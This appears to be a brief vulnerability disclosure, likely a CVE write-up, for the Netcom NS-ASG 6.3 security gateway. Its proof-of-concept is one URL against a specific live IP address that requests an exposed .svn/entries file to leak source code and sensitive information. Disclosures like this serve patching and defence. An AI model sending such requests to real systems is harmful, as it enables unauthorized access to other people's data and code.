There is a file leak in the website source code of the Netcom NS-ASG application security gateway

official website:https://www.netentsec.com/

version:NS-ASG 6.3

See the login page.
https://218.75.78.54:4443/vpnweb/index.php?para=index<img width="1370" alt="image" src="https://github.com/flyyue2001/cve/assets/88701694/506cad70-5f3e-4e02-9e1e-d90b65b1241e">
poc：https://218.75.78.54:4443/admin/helper/.svn/entries，Can access sensitive information and website source code

<img width="605" alt="image" src="https://github.com/flyyue2001/cve/assets/88701694/d2dcd916-71d2-405b-84c8-085eee637edb">
<img width="609" alt="image" src="https://github.com/flyyue2001/cve/assets/88701694/261b1944-4367-4e00-b7c3-3ec3a8c17aea">
